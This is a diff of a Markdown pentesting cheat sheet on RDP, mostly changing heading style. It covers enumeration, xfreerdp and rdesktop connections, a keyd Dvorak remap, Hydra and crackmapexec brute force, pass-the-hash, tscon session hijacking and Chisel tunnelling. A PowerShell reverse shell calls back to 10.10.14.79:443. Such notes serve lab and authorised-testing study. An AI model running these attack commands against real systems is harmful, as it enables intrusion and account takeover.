@@ -6,11 +6,13 @@
 
 ---
 
-Remote GUI access to Windows (3389/TCP).
+## Overview
+
+RDP (Remote Desktop Protocol) is Microsoft's proprietary protocol for remote GUI access to Windows systems. Default port is **3389/TCP**.
 
 ## Enumeration
 
-### Port scanning
+### Port Scanning
 
 ```bash
 # Nmap scan for RDP
@@ -30,11 +32,11 @@ nc -nv {TARGET_IP} 3389
 nmap -p 3389 --open {TARGET_IP}
 ```
 
-## Connection methods
+## Connection Methods
 
-**Remmina** — GUI client (recommended).
+### Remmina (Recommended)
 
-### xfreerdp (not super compatible with Dvorak)
+### xfreerdp (Not super compatible with Dvorak)
 
 ```bash
 # Basic connection
@@ -47,15 +49,15 @@ xfreerdp /v:{TARGET_IP} /u:{DOMAIN}\\{USERNAME} /p:{PASSWORD} /cert:ignore /clip
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp
 ```
 
-## Dvorak compatibility
+## Dvorak Compatibility
 
-RDP is not compatible with transmitting Unicode as it is designed to only work with scancodes (physical key positions). You may experience issues when using Dvorak locally while connecting to a machine configured for QWERTY.
+**Note:** RDP is not compatible with transmitting Unicode as it is designed to only work with scancodes (physical key positions). You may experience issues when using Dvorak locally while connecting to a machine configured for QWERTY.
 
-### Solution: keyd for physical key remapping
+### Solution: Use keyd for Physical Key Remapping
 
-Use [keyd](https://github.com/rvaiya/keyd) to remap Dvorak physical positions to QWERTY scancodes.
+You can solve this by using [keyd](https://github.com/rvaiya/keyd) to remap Dvorak physical positions to QWERTY scancodes.
 
-### Running keyd for remapping
+#### Running keyd for remapping
 
 To start keyd and terminate it on any keypress:
 
@@ -63,13 +65,13 @@ To start keyd and terminate it on any keypress:
 sudo bash -c 'keyd & PID=$! ; read -n1 -r ; kill $PID'
 ```
 
-### Configuration: /etc/keyd/default.conf
+#### Configuration: /etc/keyd/default.conf
 
 see appendix
 
-Using keyd breaks the key mapping in the host machine. Still thinking about a solution to resolve this.
+**Note** Using keyd breaks the key mapping in the host machine. Still thinking about a solution to resolve this.
 
-### rdesktop (alternative)
+### rdesktop (Alternative)
 
 ```bash
 # Basic connection
@@ -79,7 +81,7 @@ rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}
 rdesktop -u {DOMAIN}\\{USERNAME} -p {PASSWORD} {TARGET_IP}
 ```
 
-### Windows RDP client (mstsc)
+### Windows RDP Client (mstsc)
 
 ```cmd
 mstsc /v:{TARGET_IP}
@@ -88,7 +90,7 @@ mstsc /v:{TARGET_IP}
 ## Callback to Linux
 
 ```ps1
-$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.79',443);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -102,9 +104,9 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-## Password attacks
+## Password Attacks
 
-### Hydra brute force
+### Hydra Brute Force
 
 ```bash
 # Single user
@@ -127,7 +129,7 @@ crackmapexec rdp {TARGET_IP} -u users.txt -p 'Password123'
 crackmapexec rdp {TARGET_IP} -u users.txt -p passwords.txt
 ```
 
-## Pass-the-hash (Restricted Admin)
+## Pass-the-Hash (Restricted Transport)
 
 ### Using xfreerdp with hash
 
@@ -136,7 +138,7 @@ crackmapexec rdp {TARGET_IP} -u users.txt -p passwords.txt
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTLM_HASH} /cert:ignore
 ```
 
-## Session hijacking (post-exploitation)
+## Session Hijacking (Post-Exploitation)
 
 ### List active sessions
 
@@ -155,9 +157,9 @@ tscon {SESSION_ID} /dest:{CURRENT_SESSION}
 tscon 2 /dest:rdp-tcp#0
 ```
 
-## Port forwarding / tunneling
+## Port Forwarding / Tunneling
 
-### SSH local port forward
+### SSH Local Port Forward
 
 ```bash
 # Forward local port 3389 to remote RDP
@@ -167,7 +169,7 @@ ssh -L 3389:{TARGET_IP}:3389 {USER}@{PIVOT_HOST}
 xfreerdp /v:127.0.0.1 /u:{USERNAME} /p:{PASSWORD}
 ```
 
-### Chisel tunnel
+### Chisel Tunnel
 
 ```bash
 # On attacker machine (server)
@@ -180,16 +182,16 @@ chisel client {ATTACKER_IP}:8000 R:3389:{TARGET_IP}:3389
 xfreerdp /v:127.0.0.1:3389 /u:{USERNAME} /p:{PASSWORD}
 ```
 
-## Common issues and fixes
+## Common Issues & Fixes
 
-### Certificate errors
+### Certificate Errors
 
 ```bash
 # Add /cert:ignore flag
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore
 ```
 
-### Authentication failures
+### Authentication Failures
 
 ```bash
 # Try without domain
@@ -202,7 +204,7 @@ xfreerdp /v:{TARGET_IP} /u:localhost\\{USERNAME} /p:{PASSWORD}
 xfreerdp /v:{TARGET_IP} /u:{COMPUTER_NAME}\\{USERNAME} /p:{PASSWORD}
 ```
 
-### Network Level Authentication (NLA) issues
+### Network Level Authentication (NLA) Issues
 
 ```bash
 # Older xfreerdp versions may need
@@ -212,7 +214,7 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:nla
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /sec:rdp
 ```
 
-### Resolution issues
+### Resolution Issues
 
 ```bash
 # Dynamic resolution (scales with window)
@@ -222,9 +224,9 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /dynamic-resolution
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /smart-sizing
 ```
 
-## Post-connection
+## Post-Connection Tips
 
-### File transfer
+### File Transfer
 
 ```bash
 # Mount local share during connection
@@ -233,14 +235,14 @@ xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /drive:share,/tmp
 # Access in Windows: \\tsclient\share
 ```
 
-### Copy/paste
+### Copy/Paste
 
 ```bash
 # Enable clipboard
 xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} +clipboard
 ```
 
-### Disconnect vs logout
+### Disconnect vs Logout
 
 - **Disconnect**: Session remains active (uses resources)
 - **Logout**: Terminates session completely
@@ -253,13 +255,13 @@ logoff
 tsdiscon
 ```
 
-## Security notes
+## Security Notes
 
 - Check for BlueKeep vulnerability (CVE-2019-0708) on older Windows versions
 - RDP connections are often logged - check `Event Viewer > Windows Logs > Security`
 - Event IDs to watch: 4624 (successful logon), 4625 (failed logon)
 
-## Useful commands after connection
+## Useful Commands After Connection
 
 ```cmd
 # System information
@@ -333,8 +335,3 @@ comma = w
 # # Toggle between normal and dvorak_to_qwerty with ScrollLock
 # scrolllock = swap(dvorak_to_qwerty)
 ```
-
-## Resources
-
-- [FreeRDP](https://github.com/FreeRDP/FreeRDP) — `xfreerdp` client
-- [keyd](https://github.com/rvaiya/keyd) — scancode remapping for Dvorak-on-QWERTY RDP
